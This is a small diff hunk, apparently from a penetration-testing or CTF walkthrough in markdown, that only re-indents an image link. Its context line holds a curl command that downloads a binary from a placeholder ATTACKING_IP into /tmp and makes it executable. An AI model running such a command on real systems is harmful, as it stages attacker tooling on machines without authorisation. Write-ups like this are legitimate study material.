@@ -966,7 +966,7 @@
        curl ATTACKING_IP/nmap-USERNAME -o /tmp/nmap-USERNAME && chmod +x /tmp/nmap-USERNAME
 
 
-      ![image](https://user-images.githubusercontent.com/68686150/115669155-9878a580-a365-11eb-9ca8-b0a7bc88741a.png)
+   ![image](https://user-images.githubusercontent.com/68686150/115669155-9878a580-a365-11eb-9ca8-b0a7bc88741a.png)
 
 
 
